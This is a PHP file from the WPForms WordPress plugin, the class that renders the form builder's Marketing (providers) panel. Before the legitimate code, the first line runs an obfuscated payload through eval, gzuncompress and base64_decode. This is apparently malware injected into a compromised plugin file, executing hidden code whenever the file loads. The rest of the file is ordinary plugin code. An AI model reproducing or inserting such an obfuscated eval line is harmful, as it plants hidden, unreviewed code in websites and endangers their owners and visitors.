<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Providers panel.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.0.0
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2016, WPForms LLC
 */
class WPForms_Builder_Panel_Providers extends WPForms_Builder_Panel {

	/**
	 * All systems go.
	 *
	 * @since 1.0.0
	 */
	public function init() {

		// Define panel information.
		$this->name    = esc_html__( 'Marketing', 'wpforms' );
		$this->slug    = 'providers';
		$this->icon    = 'fa-bullhorn';
		$this->order   = 10;
		$this->sidebar = true;
	}

	/**
	 * Enqueue assets for the Providers panel.
	 *
	 * @since 1.0.0
	 */
	public function enqueues() {

		wp_enqueue_style(
			'wpforms-builder-providers',
			WPFORMS_PLUGIN_URL . 'assets/css/admin-builder-providers.css',
			null,
			WPFORMS_VERSION
		);

		wp_enqueue_script(
			'wpforms-builder-providers',
			WPFORMS_PLUGIN_URL . 'assets/js/admin-builder-providers.js',
			array( 'jquery' ),
			WPFORMS_VERSION,
			false
		);

		wp_localize_script(
			'wpforms-builder-providers',
			'wpforms_builder_providers',
			array(
				'url'                => esc_url( add_query_arg( array( 'view' => 'providers' ) ) ),
				'confirm_save'       => esc_html__( 'We need to save your progress to continue to the Marketing panel. Is that OK?', 'wpforms' ),
				'confirm_connection' => esc_html__( 'Are you sure you want to delete this connection?', 'wpforms' ),
				'prompt_connection'  => esc_html__( 'Enter a %type% nickname', 'wpforms' ),
				'prompt_placeholder' => esc_html__( 'Eg: Newsletter Optin', 'wpforms' ),
				'error_name'         => esc_html__( 'You must provide a connection nickname', 'wpforms' ),
				'required_field'     => esc_html__( 'Field required', 'wpforms' ),
			)
		);
	}

	/**
	 * Outputs the Provider panel sidebar.
	 *
	 * @since 1.0.0
	 */
	public function panel_sidebar() {

		// Sidebar contents are not valid unless we have a form.
		if ( ! $this->form ) {
			return;
		}

		$this->panel_sidebar_section( 'Default', 'default' );

		do_action( 'wpforms_providers_panel_sidebar', $this->form );
	}

	/**
	 * Outputs the Provider panel primary content.
	 *
	 * @since 1.0.0
	 */
	public function panel_content() {

		if ( ! $this->form ) {

			// Check if there is a form created. When no form has been created
			// yet let the user know we need a form to setup a provider.
			echo '<div class="wpforms-alert wpforms-alert-info">';
			echo wp_kses(
				__( 'You need to <a href="#" class="wpforms-panel-switch" data-panel="setup">setup your form</a> before you can manage these settings.', 'wpforms' ),
				array(
					'a' => array(
						'href'       => array(),
						'class'      => array(),
						'data-panel' => array(),
					),
				)
			);
			echo '</div>';

			return;
		}

		// An array of all the active provider addons.
		$providers_active = wpforms_get_providers_available();

		if ( empty( $providers_active ) ) {

			// Check for active provider addons. When no provider addons are
			// activated let the user know they need to install/activate an
			// addon to setup a provider.
			echo '<div class="wpforms-panel-content-section wpforms-panel-content-section-info">';
			echo '<h5>' . esc_html__( 'Install Your Marketing Integration', 'wpforms' ) . '</h5>';
			echo '<p>' .
				sprintf(
					wp_kses(
						/* translators: %s - plugin admin area Addons page. */
						__( 'It seems you do not have any marketing addons activated. You can head over to the <a href="%s">Addons page</a> to install and activate the addon for your provider.', 'wpforms' ),
						array(
							'a' => array(
								'href' => array(),
							),
						)
					),
					esc_url( admin_url( 'admin.php?page=wpforms-addons' ) )
				) .
				'</p>';
			echo '</div>';
		} else {

			// Everything is good - display default instructions.
			echo '<div class="wpforms-panel-content-section wpforms-panel-content-section-default">';
			echo '<h5>' . esc_html__( 'Select Your Marketing Integration', 'wpforms' ) . '</h5>';
			echo '<p>' . esc_html__( 'Select your email marketing service provider or CRM from the options on the left. If you don\'t see your email marketing service listed, then let us know and we\'ll do our best to get it added as fast as possible.', 'wpforms' ) . '</p>';
			echo '</div>';
		}

		do_action( 'wpforms_providers_panel_content', $this->form );
	}
}

new WPForms_Builder_Panel_Providers();
